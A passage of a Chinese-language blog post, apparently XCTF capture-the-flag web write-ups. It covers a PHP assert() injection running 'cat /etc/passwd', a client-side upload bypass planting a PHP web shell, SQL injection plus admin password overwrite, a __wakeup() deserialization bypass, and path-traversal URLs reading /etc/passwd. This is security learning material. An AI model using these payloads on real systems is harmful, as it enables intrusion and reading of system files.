invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第9行使用了**assert()**断言函数，这个函数是可以用来进行代码执行的，而且过滤也很简单，就是用<code>strpos (&#39;$file&#39;, &#39;..&#39;)</code>判断是否存在<code>..</code>，既然知道了过滤方法，也没有对page参数做安全校验，所以可以来命令执行</p>
<p>首先需要闭合strpos的前半部分，然后加入system()代码，再闭合后半部分，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa<span class="string">&#x27;, &#x27;</span><span class="number">123</span><span class="string">&#x27;) === false and system(&#x27;</span>cat /etc/passwd<span class="string">&#x27;) and strpos(&#x27;</span>aaa</span><br></pre></td></tr></table></figure>

<p>url编码后传参，成功执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa%<span class="number">27</span>%<span class="number">2</span>c+%<span class="number">27123</span>%<span class="number">27</span>)+%<span class="number">3</span>d%<span class="number">3</span>d%<span class="number">3</span>d+<span class="literal">false</span>+<span class="keyword">and</span>+<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat+%<span class="number">2</span>fetc%<span class="number">2</span>fpasswd%<span class="number">27</span>)+<span class="keyword">and</span>+<span class="title function_ invoke__">strpos</span>(%<span class="number">27</span>aaa</span><br></pre></td></tr></table></figure>

<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604331986.png" alt="1604049280880 (1).png"></p>
<p>修改文件为.&#x2F;templates&#x2F;flag.php文件，即可得到flag</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332006.png" alt="1604049453092 (1).png"></p>
<p>经过大佬的指点，理解了为什么git源码中看不到flag，而cat就可以，因为cat的文件和.git中存放的不是同一个文件。</p>
<h2 id="⭐-upload1（前端JS校验绕过）"><a href="#⭐-upload1（前端JS校验绕过）" class="headerlink" title="⭐ upload1（前端JS校验绕过）"></a>⭐ upload1（前端JS校验绕过）</h2><p>打开题目，一个文件上传的功能，尝试上传shell.php，提示只允许jpg或png，F12在网络中没发现js文件，查看源吗发现前端过滤的js文件：</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332095.png" alt="1602930407128(1).png"></p>
<p>使用NoScript无效后，索性抓包并主动响应该请求，修改响应包的js源码，直接将校验函数return true：</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332108.png" alt="1602930629651.png"></p>
<p>再次上传shell.php，即可成功上传</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332116.png" alt="1602930706543.png"></p>
<p>蚁剑连接，在web根目录发现flag.php，得到flag</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332124.png" alt="1602930765924.png"></p>
<p>当然还可以通过修改后缀的方式来绕过前端校验。</p>
<h2 id="⭐-ics-04（SQL注入-注册覆盖）"><a href="#⭐-ics-04（SQL注入-注册覆盖）" class="headerlink" title="⭐ ics-04（SQL注入+注册覆盖）"></a>⭐ ics-04（SQL注入+注册覆盖）</h2><p>题目描述，在系统地登录和注册处存在安全漏洞，立马想到可能是SQL注入。</p>
<p>系统有注册、登录和找回密码三处功能，注册了几个账户，登陆后体术普通用户登陆无效，看来需要管理员账户或权限</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332371.png" alt="1604221348795.png"></p>
<p>尝试在注册处抓包，通过user level修改权限进行越权，但是没有发现相关参数。</p>
<p>接着在找回密码处发现了SQL注入，直接丢SQLmap跑出了user表的内容，得到一个默认账户，猜测是管理员账户</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332386.png" alt="1604221498269(1).png"></p>
<p>密码MD5直接跑出来了😂应该是做了这个题后添加了这条记录吧</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332417.png" alt="1604221772450.png"></p>
<p>登录该账户，即可得到flag。</p>
<p>但是这道题应该不是仅仅利用一个SQL注入的，原意是密码无法解开吧，所以在SQL注入得到管理员用户名后，需要利用重复注册漏洞来覆盖管理员密码</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/02/1604332426.png" alt="1604222001521.png"></p>
<p>用设定的新密码登录，即可得到flag</p>
<h2 id="⭐-unserialize3（php反序列化-wakeup-绕过）"><a href="#⭐-unserialize3（php反序列化-wakeup-绕过）" class="headerlink" title="⭐ unserialize3（php反序列化__wakeup()绕过）"></a>⭐ unserialize3（php反序列化__wakeup()绕过）</h2><p>题目是一段php代码，是反序列化题目，需要将序列化结果通过code传递。</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605324557.png" alt="1602406299342.png"></p>
<p>源码保存到本地，添加序列化代码进行审计和输出测试，需要补全大括号</p>
<pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> xctf;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</code></pre>
<p>首先发现，代码中存在__wakeup()魔术方法，该魔术方法在反序列化操作执行前调用，用于初始化操作，如获取必要资源等。</p>
<p>但是本题中<code>__wakeup()</code>内容是结束程序，因此很明显本题是要利用__wakeup()魔术方法的失效漏洞，即<strong>在反序列化时，当对象属性个数大于真实个数，就会绕过该魔术方法直接执行反序列化操作。</strong></p>
<p>执行该代码，得到以下序列化结果：</p>
<pre><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;
</code></pre>
<p>将属性数量改为大于当前数量的值，比如2，然后发包，即可得到flag</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/14/1605324566.png" alt="1602405430595.png"></p>
<h2 id="⭐-warmup（文件包含）"><a href="#⭐-warmup（文件包含）" class="headerlink" title="⭐ warmup（文件包含）"></a>⭐ warmup（文件包含）</h2><p><a target="_blank" rel="noopener" href="https://www.yyxzz.net/articles/169.html"><strong>https://www.yyxzz.net/articles/169.html</strong></a></p>
<p>题目出自2018 HCTF，打开链接（滑稽.jpg）🧐<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923174.png" alt="1602763719432.png"></p>
<p>将图片保存到本地没有发现线索，查看网页源码，发现了提示：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923200.png" alt="1602763786996.png"></p>
<p>存在source.php，于是地址后边跟source.php，成功输出源码<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923210.png" alt="1602763852951.png"></p>
<p><strong>保存至本地，进行代码审计</strong></p>
<p>但是审计时发现，诶，怎么有点熟悉，好像之前复现了一个phpmyadmin任意文件包含的漏洞，跟这个题目的源码逻辑一模一样，太棒了！</p>
<p>具体的审计过程可以参考之前的phpmyadmin漏洞复现，原理一模一样！</p>
<p>这里大致说一下漏洞：</p>
<ul>
<li>程序设定文件白名单，并利用？分割后的第一个数据来做白名单校验，还加入了urldecode，因此可以二次传递进行目录穿越，达到任意文件读取。</li>
</ul>
<p>OK回到题目，经过对source.php审计发现，还有一个hint.php，因为是白名单内所以正常包含该文件，得到以下关于flag的线索：存在于 ffffllllaaaagggg 文件内<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923287.png" alt="1602764402114.png"></p>
<p>在当前目录包含失败后，考虑可能存在于根目录，于是不断尝试利用passwd文件找到根目录</p>
<p>payload：</p>
<pre><code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:54486?file=hint.php?/../../../../etc/passwd</span><br></pre></td></tr></table></figure>
</code></pre>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923309.png" alt="1602764669041.png"></p>
<p>根目录包含flag文件，得到flag</p>
<p>payload：<br>    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:54486?file=hint.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure></p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/17/1602923324.png" alt="1602764846675.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://blog.sma11new.com">sma11new</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.sma11new.com/post/20200972133.html">https://blog.sma11new.com/post/20200972133.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.sma11new.com" target="_blank">sma11new</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/XCTF/">XCTF</a></div><div class="post_share"><div class="social-share" data-image="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/background/xiaoxin/xiaoxin_pic7.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/202009291352.html"><img class="prev-cover" src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/background/xiaoxin/xiaoxin_pic7.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">【漏洞分析】CVE-2018-12613 - phpmyadmin后台任意文件包含</div></div></a></div><div class="next-post pull-right"><a href="/post/202001291501.html"><img class="next-cover" src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202212041706924.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【密码学】Diffie-Hellman密钥交换算法之Python实现</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-Web-php-unserialize%EF%BC%88-wakeup-%E7%BB%95%E8%BF%87-%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">⭐ Web_php_unserialize（__wakeup()绕过+正则匹配绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-fakebook%EF%BC%88SSRF-SQL%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">⭐ fakebook（SSRF+SQL注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B"><span class="toc-number">2.1.</span> <span class="toc-text">总结一下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">2.2.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-cat%EF%BC%88Django%E5%AE%BD%E5%AD%97%E8%8A%82%E6%8A%A5%E9%94%99-php-curl-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">⭐ cat（Django宽字节报错+php curl @读取文件）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83-1"><span class="toc-number">3.2.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-ics-05%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-php-x2F-x2F-filter%E6%9C%AC%E5%9C%B0%E8%AF%BB%E5%8F%96-preg-replace-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">⭐ ics-05（文件包含+php:&#x2F;&#x2F;filter本地读取+preg_replace()命令执行）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83-2"><span class="toc-number">4.1.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-FlatScience%EF%BC%88SQLite%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5-python%E8%84%9A%E6%9C%AC%E5%AF%86%E7%A0%81%E7%A2%B0%E6%92%9E%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">⭐ FlatScience（SQLite回显注入+python脚本密码碰撞）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-bug%EF%BC%88%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-XFF%E4%BC%AA%E9%80%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">⭐ bug（任意用户密码重置+XFF伪造+文件上传）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-shrine%EF%BC%88SSTI-url-for-%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">⭐ shrine（SSTI+url_for()沙盒逃逸）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-Web2%EF%BC%88%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">⭐ Web2（程序逆向）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-PHP2%EF%BC%88phps%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F-URLencode%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">9.</span> <span class="toc-text">⭐ PHP2（phps源码泄漏+URLencode绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-NewsCenter%EF%BC%88%E5%B8%B8%E8%A7%84SQL%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">10.</span> <span class="toc-text">⭐ NewsCenter（常规SQL注入）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-mfw%EF%BC%88-git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2-assert-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-number">11.</span> <span class="toc-text">⭐ mfw（.git源码泄露+assert()命令执行）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-upload1%EF%BC%88%E5%89%8D%E7%AB%AFJS%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">12.</span> <span class="toc-text">⭐ upload1（前端JS校验绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-ics-04%EF%BC%88SQL%E6%B3%A8%E5%85%A5-%E6%B3%A8%E5%86%8C%E8%A6%86%E7%9B%96%EF%BC%89"><span class="toc-number">13.</span> <span class="toc-text">⭐ ics-04（SQL注入+注册覆盖）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-unserialize3%EF%BC%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wakeup-%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">14.</span> <span class="toc-text">⭐ unserialize3（php反序列化__wakeup()绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-warmup%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89"><span class="toc-number">15.</span> <span class="toc-text">⭐ warmup（文件包含）</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By sma11new</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>